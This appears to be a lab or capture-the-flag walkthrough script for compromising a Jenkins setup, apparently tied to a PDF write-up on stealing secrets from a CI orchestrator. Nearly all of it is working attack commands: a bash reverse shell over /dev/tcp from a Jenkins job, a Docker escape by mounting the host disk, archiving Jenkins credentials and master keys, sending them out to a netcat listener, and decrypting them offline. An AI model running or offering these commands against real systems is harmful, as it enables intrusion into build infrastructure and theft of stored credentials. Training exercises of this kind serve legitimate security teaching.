# How can you pivot onto the master server, take a look at available nodes

# Enable the node-docker-privileged
# Create a new job or modify an existing one and add the following step
# Look at the PDF writeup to find exactly what you need to set up
bash -c "bash -i >& /dev/tcp/{PLACEHOLDER_PRIVATE_IP}/4242 0>&1"


# Now you'll need to escape the docker
lsblk
mkdir mount_point
mount /dev/[mount_point_name] mount_point
cd mount_point/bitnami/jenkins/home
tar cvf to_export.tar credentials.xml secrets/master.key secrets/hudson.util.Secret

# You need to exfiltrate the tar file
### on your kali
nc -lp 4243 > exfiltrated_secrets.tar
### On the victim system
cat to_export.tar > /dev/tcp/{PLACEHOLDER_PRIVATE_IP}/4243

### on your kali
tar xvf exfiltrated_secrets.tar

# You can read there to find the file needed to decrypt the secrets https://github.com/gquere/pwn_jenkins
 python3.9 /writeup/4_Stealing-secrets-from-the-orchestrator/jenkins_offline_decrypt.py secrets/master.key secrets/hudson.util.Secret credentials.xml
